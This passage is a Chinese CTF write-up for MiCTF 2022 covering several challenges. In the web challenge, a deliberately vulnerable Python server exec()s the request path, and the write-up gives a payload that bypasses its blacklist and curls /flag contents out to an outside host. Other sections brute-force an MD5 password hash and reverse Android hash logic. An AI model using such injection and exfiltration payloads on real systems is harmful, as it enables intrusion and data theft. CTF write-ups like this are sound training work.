+</span><span style="display:block;padding:0 1.25rem">    def stringResponse(self):
+</span><span style="display:block;padding:0 1.25rem">        return respTemplate.format(**self.__dict__)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">class Request:
+</span><span style="display:block;padding:0 1.25rem">    def __init__(self, request):
+</span><span style="display:block;padding:0 1.25rem">        self.good = True
+</span><span style="display:block;padding:0 1.25rem">        try:
+</span><span style="display:block;padding:0 1.25rem">            request = self.parseRequest(request)
+</span><span style="display:block;padding:0 1.25rem">            self.method = request[&quot;method&quot;]
+</span><span style="display:block;padding:0 1.25rem">            self.doc = request[&quot;doc&quot;]
+</span><span style="display:block;padding:0 1.25rem">            self.vers = request[&quot;vers&quot;]
+</span><span style="display:block;padding:0 1.25rem">            self.header = request[&quot;header&quot;]
+</span><span style="display:block;padding:0 1.25rem">            self.body = request[&quot;body&quot;]
+</span><span style="display:block;padding:0 1.25rem">        except:
+</span><span style="display:block;padding:0 1.25rem">            self.good = False
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def parseRequest(self, request):
+</span><span style="display:block;padding:0 1.25rem">        req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)
+</span><span style="display:block;padding:0 1.25rem">        method, doc, vers = req[0].split(&quot; &quot;)
+</span><span style="display:block;padding:0 1.25rem">        header = req[1:-3]
+</span><span style="display:block;padding:0 1.25rem">        body = req[-1]
+</span><span style="display:block;padding:0 1.25rem">        headerDict = {}
+</span><span style="display:block;padding:0 1.25rem">        for param in header:
+</span><span style="display:block;padding:0 1.25rem">            pos = param.find(&quot;: &quot;)
+</span><span style="display:block;padding:0 1.25rem">            key, val = param[:pos], param[pos + 2:]
+</span><span style="display:block;padding:0 1.25rem">            headerDict.update({key: val})
+</span><span style="display:block;padding:0 1.25rem">        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">class Server:
+</span><span style="display:block;padding:0 1.25rem">    def __init__(self, host, port):
+</span><span style="display:block;padding:0 1.25rem">        self.host = host
+</span><span style="display:block;padding:0 1.25rem">        self.port = port
+</span><span style="display:block;padding:0 1.25rem">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span><span style="display:block;padding:0 1.25rem">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+</span><span style="display:block;padding:0 1.25rem">        self.sock.bind((self.host, self.port))
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def listen(self):
+</span><span style="display:block;padding:0 1.25rem">        self.sock.listen(5)
+</span><span style="display:block;padding:0 1.25rem">        while True:
+</span><span style="display:block;padding:0 1.25rem">            client, address = self.sock.accept()
+</span><span style="display:block;padding:0 1.25rem">            client.settimeout(60)
+</span><span style="display:block;padding:0 1.25rem">            threading.Thread(target=self.listenToClient, args=(client, address)).start()
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def listenToClient(self, client, address):
+</span><span style="display:block;padding:0 1.25rem">        size = 1024
+</span><span style="display:block;padding:0 1.25rem">        while True:
+</span><span style="display:block;padding:0 1.25rem">            try:
+</span><span style="display:block;padding:0 1.25rem">                data = client.recv(size)
+</span><span style="display:block;padding:0 1.25rem">                if data:
+</span><span style="display:block;padding:0 1.25rem">                    req = Request(data.decode())
+</span><span style="display:block;padding:0 1.25rem">                    self.handleRequest(req, client, address)
+</span><span style="display:block;padding:0 1.25rem">                    client.shutdown()
+</span><span style="display:block;padding:0 1.25rem">                    client.close()
+</span><span style="display:block;padding:0 1.25rem">                else:
+</span><span style="display:block;padding:0 1.25rem">                    raise error(&#x27;Client disconnected&#x27;)
+</span><span style="display:block;padding:0 1.25rem">            except:
+</span><span style="display:block;padding:0 1.25rem">                client.close()
+</span><span style="display:block;padding:0 1.25rem">                return False
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def handleRequest(self, request, conn, address):
+</span><span style="display:block;padding:0 1.25rem">        if request.good:
+</span><span style="display:block;padding:0 1.25rem">            document = self.serveDoc(request.doc, DOC_ROOT)
+</span><span style="display:block;padding:0 1.25rem">            statusNum = document[&quot;status&quot;]
+</span><span style="display:block;padding:0 1.25rem">        else:
+</span><span style="display:block;padding:0 1.25rem">            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)
+</span><span style="display:block;padding:0 1.25rem">            statusNum = &quot;400&quot;
+</span><span style="display:block;padding:0 1.25rem">        body = document[&quot;body&quot;]
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        statusCode = CODES[statusNum]
+</span><span style="display:block;padding:0 1.25rem">        dateSent = &quot;&quot;
+</span><span style="display:block;padding:0 1.25rem">        server = &quot;SimpleHTTP/0.6 Python/3.8.2&quot;
+</span><span style="display:block;padding:0 1.25rem">        modified = &quot;&quot;
+</span><span style="display:block;padding:0 1.25rem">        length = len(body)
+</span><span style="display:block;padding:0 1.25rem">        contentType = document[&quot;mime&quot;]
+</span><span style="display:block;padding:0 1.25rem">        connectionType = &quot;Closed&quot;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        resp = Response(
+</span><span style="display:block;padding:0 1.25rem">            statusNum=statusNum, statusCode=statusCode,
+</span><span style="display:block;padding:0 1.25rem">            dateSent=dateSent, server=server,
+</span><span style="display:block;padding:0 1.25rem">            modified=modified, length=length,
+</span><span style="display:block;padding:0 1.25rem">            contentType=contentType, connectionType=connectionType,
+</span><span style="display:block;padding:0 1.25rem">            body=body
+</span><span style="display:block;padding:0 1.25rem">        )
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        data = resp.stringResponse()
+</span><span style="display:block;padding:0 1.25rem">        if not data:
+</span><span style="display:block;padding:0 1.25rem">            return -1
+</span><span style="display:block;padding:0 1.25rem">        conn.sendall(bytes(&quot;HTTP/1.1 200 OK\r\nServer: SimpleHTTP/0.6 Python/3.8\r\nConnection: Closed\r\n\r\n&quot;,&quot;utf-8&quot;))
+</span><span style="display:block;padding:0 1.25rem">        conn.sendall(body)
+</span><span style="display:block;padding:0 1.25rem">        return 0
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def waf(self,input):
+</span><span style="display:block;padding:0 1.25rem">        blacklist = r&quot;import|\[|\]|builtins｜\|&quot;
+</span><span style="display:block;padding:0 1.25rem">        if re.search(blacklist,input,re.I|re.M):
+</span><span style="display:block;padding:0 1.25rem">            print(&quot;Oh you are hacker! I can&#x27;t allow your input.&quot;)
+</span><span style="display:block;padding:0 1.25rem">            input = re.sub(blacklist,&#x27;&#x27;,input)
+</span><span style="display:block;padding:0 1.25rem">        return input
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    def serveDoc(self, path, docRoot):
+</span><span style="display:block;padding:0 1.25rem">        path = urllib.parse.unquote(path)
+</span><span style="display:block;padding:0 1.25rem">        try:
+</span><span style="display:block;padding:0 1.25rem">            info = &quot;output = &#x27;Document: {}&#x27;&quot;
+</span><span style="display:block;padding:0 1.25rem">            #print(self.waf(info.format(path)))
+</span><span style="display:block;padding:0 1.25rem">            exec (self.waf(info.format(path)))
+</span><span style="display:block;padding:0 1.25rem">            cwd = os.path.dirname(os.path.realpath(__file__))
+</span><span style="display:block;padding:0 1.25rem">            docRoot = os.path.join(cwd, docRoot)
+</span><span style="display:block;padding:0 1.25rem">            if path == &quot;/&quot;:
+</span><span style="display:block;padding:0 1.25rem">                path = &quot;../index.html&quot;
+</span><span style="display:block;padding:0 1.25rem">            requested = os.path.join(docRoot, path[1:])
+</span><span style="display:block;padding:0 1.25rem">            print(requested+str(os.path.isfile(requested)))
+</span><span style="display:block;padding:0 1.25rem">            if os.path.isfile(requested):
+</span><span style="display:block;padding:0 1.25rem">                mime = mimetypes.guess_type(requested)
+</span><span style="display:block;padding:0 1.25rem">                mime = (mime if mime[0] != None else &quot;text/html&quot;)
+</span><span style="display:block;padding:0 1.25rem">                mime = MIMES[requested.split(&quot;.&quot;)[-1]]
+</span><span style="display:block;padding:0 1.25rem">                try:
+</span><span style="display:block;padding:0 1.25rem">                    with open(requested, &quot;rb&quot;) as f:
+</span><span style="display:block;padding:0 1.25rem">                        data = f.read()
+</span><span style="display:block;padding:0 1.25rem">                except:
+</span><span style="display:block;padding:0 1.25rem">                    with open(requested, &quot;rb&quot;) as f:
+</span><span style="display:block;padding:0 1.25rem">                        data = f.read()
+</span><span style="display:block;padding:0 1.25rem">                status = &quot;200&quot;
+</span><span style="display:block;padding:0 1.25rem">            else:
+</span><span style="display:block;padding:0 1.25rem">                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)
+</span><span style="display:block;padding:0 1.25rem">                print(errorPage)
+</span><span style="display:block;padding:0 1.25rem">                mime = &quot;text/html&quot;
+</span><span style="display:block;padding:0 1.25rem">                with open(errorPage, &quot;rb&quot;) as f:
+</span><span style="display:block;padding:0 1.25rem">                    data = f.read()
+</span><span style="display:block;padding:0 1.25rem">                status = &quot;404&quot;
+</span><span style="display:block;padding:0 1.25rem">        except Exception as e:
+</span><span style="display:block;padding:0 1.25rem">            #print(e)
+</span><span style="display:block;padding:0 1.25rem">            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)
+</span><span style="display:block;padding:0 1.25rem">            mime = &quot;text/html&quot;
+</span><span style="display:block;padding:0 1.25rem">            with open(errorPage, &quot;rb&quot;) as f:
+</span><span style="display:block;padding:0 1.25rem">                data = f.read()
+</span><span style="display:block;padding:0 1.25rem">            status = &quot;500&quot;
+</span><span style="display:block;padding:0 1.25rem">        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">if __name__ == &#x27;__main__&#x27;:
+</span><span style="display:block;padding:0 1.25rem">    Server(&quot;0.0.0.0&quot;,7777).listen()</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">关键点在exec那句话，程序会将path放在exec命令中执行，我们就需要构造path，绕过waf对import、方括号、builtins和竖线的过滤。</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>http://10.38.202.214:7777/&#x27;+str(eval(&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).system(&quot;curl http://10.167.90.69:1337/hello/$(cat /flag | base64)&quot;)&#x27;))+&#x27;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">通过字符串连接将import隔开，通过访问远程路径的方式，将信息传输出去。</p>
+<p class="my-4 leading-7">这个题目可以在本地起服务，慢慢调试。</p>
+<h2 id="embedded-1-躲猫猫" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#embedded-1-躲猫猫">#</a>embedded-1 躲猫猫</h2>
+<p class="my-4 leading-7">文件打开，在最后发现了flag信息，这两块的****的内容可以相互补充。</p>
+<p class="my-4 leading-7"><img alt="直接找" src="/static/image/embedded-1-1.9f8a2111.png"/></p>
+<h2 id="crypto-1-乱码中的奥妙" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#crypto-1-乱码中的奥妙">#</a>crypto-1 乱码中的奥妙</h2>
+<p class="my-4 leading-7">给了三个文件，加密文本、密码列表和一个加密解密算法。写个程序用密码列表中的密码依次解密加密文本，找到以fl开头的解密结果。</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.crypto_1;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">import java.io.*;
+</span><span style="display:block;padding:0 1.25rem">import java.nio.file.Files;
+</span><span style="display:block;padding:0 1.25rem">import java.util.Scanner;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class Main {
+</span><span style="display:block;padding:0 1.25rem">    public static void main(String[] args) throws IOException {
+</span><span style="display:block;padding:0 1.25rem">        File passwordFile = new File(&quot;src/main/java/com/sumygg/mictf2022/crypto_1/passwords.passwords&quot;);
+</span><span style="display:block;padding:0 1.25rem">        File cipherTextFile = new File(&quot;src/main/java/com/sumygg/mictf2022/crypto_1/cipherText.txt&quot;);
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        Scanner cipherTextScanner = new Scanner(Files.newInputStream(cipherTextFile.toPath()));
+</span><span style="display:block;padding:0 1.25rem">        String cipherText = cipherTextScanner.nextLine();
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        System.out.println(&quot;cipherText = &quot; + cipherText);
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        Scanner passwordScanner = new Scanner(Files.newInputStream(passwordFile.toPath()));
+</span><span style="display:block;padding:0 1.25rem">        while (passwordScanner.hasNext()) {
+</span><span style="display:block;padding:0 1.25rem">            String passwd = passwordScanner.nextLine();
+</span><span style="display:block;padding:0 1.25rem">            String decode = R96Crypto.encdec(R96Crypto.DEC, passwd, cipherText);
+</span><span style="display:block;padding:0 1.25rem">            if (decode.startsWith(&quot;fl&quot;)) {
+</span><span style="display:block;padding:0 1.25rem">                System.out.println(passwd + &quot; &quot; + decode);
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="misc-1-图片中的秘密" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-1-图片中的秘密">#</a>misc-1 图片中的秘密</h2>
+<p class="my-4 leading-7">不解释</p>
+<p class="my-4 leading-7"><img alt="又是直接找" src="/static/image/misc-1-1.f15906f1.png"/></p>
+<h2 id="misc-2-弱密码不可有" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-2-弱密码不可有">#</a>misc-2 弱密码不可有！</h2>
+<p class="my-4 leading-7">根据描述构造爆破密码</p>
+<ul class="list-disc pl-5 my-4 leading-7">
+<li class="[&amp;:not(:first-child)]:mt-2">14位英文和数字</li>
+<li class="[&amp;:not(:first-child)]:mt-2">00后，包含生日</li>
+<li class="[&amp;:not(:first-child)]:mt-2">第一位做了修改（应该是小写改大写）</li>
+<li class="[&amp;:not(:first-child)]:mt-2">最后一位加了1个符号</li>
+</ul>
+<p class="my-4 leading-7">只有这些信息破解起来有点麻烦，还需要合理猜测，比如开头是xiaomi，这样正好6英文+8数字=14位。</p>
+<p class="my-4 leading-7">剩下的就是破解生日和特殊符号了。</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import hashlib
+</span></span><span style="display:block;padding:0 1.25rem">import datetime
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">target = &#x27;a1c6eaee90a012a1bb054bddcd081d6a&#x27;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">additional_chars = &#x27;~!@#$%^&amp;*()[{]}-_=+|;:\&#x27;&quot;,&lt;.&gt;/?`&#x27;
+</span><span style="display:block;padding:0 1.25rem">uppercase_letters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;
+</span><span style="display:block;padding:0 1.25rem">lowercase_letters = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">first_date = datetime.date(2000, 1, 1)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">cnt = 0
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def dfs(is_first: bool, is_end: bool, has_birth: bool, pass_str: str):
+</span><span style="display:block;padding:0 1.25rem">    # 已经拼接好，计算md5比对
+</span><span style="display:block;padding:0 1.25rem">    if is_end:
+</span><span style="display:block;padding:0 1.25rem">        global cnt
+</span><span style="display:block;padding:0 1.25rem">        cnt = cnt + 1
+</span><span style="display:block;padding:0 1.25rem">        hl = hashlib.md5()
+</span><span style="display:block;padding:0 1.25rem">        hl.update(pass_str.encode(encoding=&#x27;utf-8&#x27;))
+</span><span style="display:block;padding:0 1.25rem">        # print(pass_str + &quot; &quot; + hl.hexdigest())
+</span><span style="display:block;padding:0 1.25rem">        if hl.hexdigest() == target:
+</span><span style="display:block;padding:0 1.25rem">            print(&quot;found &quot; + pass_str)
+</span><span style="display:block;padding:0 1.25rem">        if cnt % 1000000 == 0:
+</span><span style="display:block;padding:0 1.25rem">            print(cnt)
+</span><span style="display:block;padding:0 1.25rem">        return
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    # 14位，补充特殊符号
+</span><span style="display:block;padding:0 1.25rem">    if len(pass_str) == 14:
+</span><span style="display:block;padding:0 1.25rem">        for ch in additional_chars:
+</span><span style="display:block;padding:0 1.25rem">            dfs(is_first, True, has_birth, pass_str + ch)
+</span><span style="display:block;padding:0 1.25rem">        return
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    # 拼接第一位
+</span><span style="display:block;padding:0 1.25rem">    if is_first:
+</span><span style="display:block;padding:0 1.25rem">        for ch in uppercase_letters:
+</span><span style="display:block;padding:0 1.25rem">            dfs(False, is_end, has_birth, ch)
+</span><span style="display:block;padding:0 1.25rem">        return
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    # 拼接普通字母
+</span><span style="display:block;padding:0 1.25rem">    if len(pass_str) &lt; 6:
+</span><span style="display:block;padding:0 1.25rem">        for ch in lowercase_letters:
+</span><span style="display:block;padding:0 1.25rem">            dfs(is_first, is_end, has_birth, pass_str + ch)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    # 拼接生日字符串
+</span><span style="display:block;padding:0 1.25rem">    elif not has_birth:
+</span><span style="display:block;padding:0 1.25rem">        for d in range(0, 365 * 5):
+</span><span style="display:block;padding:0 1.25rem">            date_str = (first_date + datetime.timedelta(d)).strftime(&quot;%Y%m%d&quot;)
+</span><span style="display:block;padding:0 1.25rem">            dfs(is_first, is_end, True, pass_str + date_str)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    return
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">dfs(False, False, False, &#x27;Xiaomi&#x27;)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">找到了 <code>Xiaomi20020604@</code></p>
+<p class="my-4 leading-7">用上面的密码解压完给出的flag.zip，找到一个word文件。</p>
+<p class="my-4 leading-7"><img alt="买的正版的Office的唯一用途" src="/static/image/misc-2-1.9631d431.png"/></p>
+<p class="my-4 leading-7">看格式是一种叫ook的语言，有个在线解码器 <a target="_blank" rel="noopener noreferrer" href="https://www.splitbrain.org/services/ook" class="link-_707cf  link_3b154 inline-link_3b154">https://www.splitbrain.org/services/ook</a></p>
+<p class="my-4 leading-7">但是文本解出来的只有flag的前半部分，后半部分去哪儿了？原来藏在的work文件最后，该个颜色就出来了。</p>
+<p class="my-4 leading-7"><img alt="让我想起了论文凑字数" src="/static/image/misc-2-2.26b6234c.png"/></p>
+<p class="my-4 leading-7">将两部分合并，得到完整的flag。</p>
+<h2 id="android-1-抓token" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#android-1-抓token">#</a>android-1 抓token</h2>
+<p class="my-4 leading-7">用jd-gui反编译smali代码转成java伪代码，发现大概算法是每两个字符经过运算出一个hash，和目标数组里的hash值比较是否一致。</p>
+<p class="my-4 leading-7">将逻辑提取出来，用程序搜索一下：</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.android_1;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class CatchToken2 {
+</span><span style="display:block;padding:0 1.25rem">    private static final int[] target = new int[]{
+</span><span style="display:block;padding:0 1.25rem">            -912680206, 2031609106, -815368373, 1069350675, -1370062066, -1772356947, -987972278, 96827298, 1685607320, 1067167222,
+</span><span style="display:block;padding:0 1.25rem">            -2063214181, 1081770804, -1341224450, 1264237829, -617750188, 1934300439};
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    private static String searchToken(Integer target) {
+</span><span style="display:block;padding:0 1.25rem">        for (char ch1 = &#x27; &#x27;; ch1 &lt;= &#x27;~&#x27;; ch1++) {
+</span><span style="display:block;padding:0 1.25rem">            for (char ch2 = &#x27; &#x27;; ch2 &lt;= &#x27;~&#x27;; ch2++) {
+</span><span style="display:block;padding:0 1.25rem">                int j = ((ch2 &amp; 0xFF) &lt;&lt; 8 | ch1 &amp; 0xFF) * -862048943;
+</span><span style="display:block;padding:0 1.25rem">                j = (j &lt;&lt; 15 | j &gt;&gt;&gt; 17) * 461845907 ^ 0x64 ^ 0x2;
+</span><span style="display:block;padding:0 1.25rem">                j = (j ^ j &gt;&gt;&gt; 16) * -2048144789;
+</span><span style="display:block;padding:0 1.25rem">                j = (j ^ j &gt;&gt;&gt; 13) * -1028477387;
+</span><span style="display:block;padding:0 1.25rem">                int res = j ^ j &gt;&gt;&gt; 16;
+</span><span style="display:block;padding:0 1.25rem">                if (res == target) {
+</span><span style="display:block;padding:0 1.25rem">                    return &quot;&quot; + ch1 + ch2;
+</span><span style="display:block;padding:0 1.25rem">                }
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">        return &quot;++NOT FOUND++&quot;;
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public static void main(String[] args) {
+</span><span style="display:block;padding:0 1.25rem">        for (int tar : target) {
+</span><span style="display:block;padding:0 1.25rem">            System.out.print(searchToken(tar));
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">        System.out.println();
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="android-2-easy-android" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#android-2-easy-android">#</a>android-2 easy android</h2>
